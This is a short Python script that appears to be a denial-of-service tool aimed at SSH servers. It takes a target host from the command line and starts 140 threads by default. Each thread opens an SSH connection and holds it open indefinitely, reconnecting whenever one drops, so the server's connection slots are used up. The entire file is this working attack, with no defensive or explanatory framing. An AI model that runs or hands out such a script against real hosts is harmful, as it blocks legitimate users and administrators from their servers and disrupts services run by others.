from sys import argv
from ssh.session import Session
from ssh import options
from time import sleep

import _thread as thread

HOST = argv[1]
USERNAME = 'root'
CONCURRENT = 140

try:
    CONCURRENT = int(argv[2])
except:
    pass

count = 0

def go():
    while True:
        try:
            s = Session()
            s.options_set(options.HOST, HOST)
            s.connect()
            sleep(2147483647)
        except:
            global count
            print('died #' + str(count))
            count += 1
            pass


if __name__ == "__main__":
    for i in range(CONCURRENT):
        thread.start_new_thread(go, ())
        
    sleep(2147483647)
